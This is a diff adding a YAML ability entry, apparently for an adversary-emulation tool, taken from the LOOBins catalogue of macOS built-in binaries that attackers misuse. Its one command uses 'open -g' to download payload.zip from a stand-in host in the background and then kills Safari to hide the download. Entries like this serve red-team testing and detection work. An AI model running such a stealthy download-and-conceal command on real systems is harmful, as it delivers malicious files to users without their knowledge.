@@ -1,0 +1,28 @@
+- id: 1245e0a7-078a-9696-a4b1-a450dbda96d3
+  name: open - Download a malicious file
+  description: The following command downloads the payload.zip file in the default browser (Safari) and
+    then kills it.
+  tactic: execution
+  technique:
+    attack_id: T1059.004
+    name: 'Command and Scripting Interpreter: Unix Shell'
+  platforms:
+    darwin:
+      sh:
+        command: open -g https://mypayload.io/payload.zip; sleep 3; killall Safari
+  singleton: false
+  privilege: User
+  repeatable: true
+  delete_payload: true
+  buckets:
+  - loobins
+  - open
+  - execution
+  version: '1.0'
+  author: LOOBins Project
+  additional_info:
+    loobins_tool: open
+    use_case: Download a malicious file
+    source_file: open.yml
+    source_repository: https://github.com/infosecB/LOOBins
+    import_timestamp: '2025-06-24T09:00:11.297757Z'
